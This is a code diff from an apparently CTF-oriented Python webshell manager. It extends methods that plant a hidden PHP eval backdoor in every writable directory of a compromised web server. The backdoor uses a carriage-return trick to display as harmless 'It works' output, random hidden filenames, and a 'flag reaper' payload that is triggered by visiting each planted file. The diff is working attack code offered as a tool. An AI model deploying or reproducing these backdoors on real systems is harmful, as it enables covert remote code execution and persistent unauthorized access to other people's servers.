@@ -571,16 +571,19 @@ class WebShell():
 
 
     def auto_inject_webshell(self, filename, password):
+        # TODO : remove arg filename
         webshell_content = "<?php eval($_REQUEST['%s']);?>" % (password)
         fake_content = "<?php print_r('It works');?>"
         padding = " " * (len(webshell_content) - len(fake_content))
         content = webshell_content + "\r" + fake_content + padding + "\n"
-        self.auto_inject_phpfile(filename, content)
+        urls = self.auto_inject_phpfile(filename, content)
+        Log.success("Inject success : \n%s" % (urls))
 
     def auto_inject_flag_reaper(self, filename, content):
-        url = self.auto_inject_phpfile(filename, content)
-        if url:
-            Log.success("Inject flag reaper success!")
+        # TODO : remove arg filename
+        urls = self.auto_inject_phpfile(filename, content)
+        success_numbers = 0
+        for url in urls:
             Log.info("Trying to visit : [%s] to launch the flag reaper..." % (url))
             Log.info("Setting timeout to 1 second ...")
             try:
@@ -589,13 +592,19 @@ class WebShell():
                 Log.error("\n%s\n" % (response.content))
             except Exception as e:
                 error_content = str(e)
+                Log.info(error_content)
                 if "Read timed out" in error_content:
-                    return True
+                    Log.success("Actived!")
+                    success_numbers += 1
+                    # return True
                 else:
                     Log.error("Error! Maybe the directory is not writable!")
+        if success_numbers > 0:
+            Log.success("Active finished : [%d/%d]" % (success_numbers, len(urls)))
+            return True
         else:
-            Log.error("Inject flag reaper error!")
-        return False
+            Log.error("All failed!")
+            return False
 
     def auto_inject_phpfile(self, filename, webshell_content):
         Log.info("Auto injecting : [%s] => [%s]" % (filename, repr(webshell_content)))
@@ -603,19 +612,21 @@ class WebShell():
         Log.info("Length : [%d]" % (len(webshell_content)))
         Log.info("Getting writable dirs...")
         writable_dirs = self.get_writable_directory()
+        urls = []
         if len(writable_dirs) == 0:
             Log.error("No writable dirs...")
             return False
         else:
             for writable_dir in writable_dirs:
+                writable_dir += "/"
+                filename = ".%s.php" % (random_string(16, string.letters + string.digits))
                 Log.info("Writing [%s] into : [%s]" % (repr(webshell_content), writable_dir))
                 php_code = "file_put_contents('%s',base64_decode('%s'));" % ("%s/%s" % (writable_dir, filename), webshell_content.encode("base64").replace("\n",""))
                 self.php_code_exec(php_code)
                 base_url = "%s%s" % ("".join(["%s/" % (i) for i in self.url.split("/")[0:3]]), writable_dir.replace("%s" % (self.webroot), ""))
-                print "baseurl : %s" % (base_url)
-                webshell_url = "%s%s" % (base_url, filename)
-                print "webshell_url : %s" % (webshell_url)
+                webshell_url = ("%s%s" % (base_url, filename)).replace("//", "/").replace("https:/", "https://").replace("http:/", "http://")
                 with open("Webshell.txt", "a+") as f:
                     log_content = "%s => %s\n" % (webshell_url, repr(webshell_content))
                     f.write(log_content)
-                return webshell_url
+                urls.append(webshell_url)
+        return urls
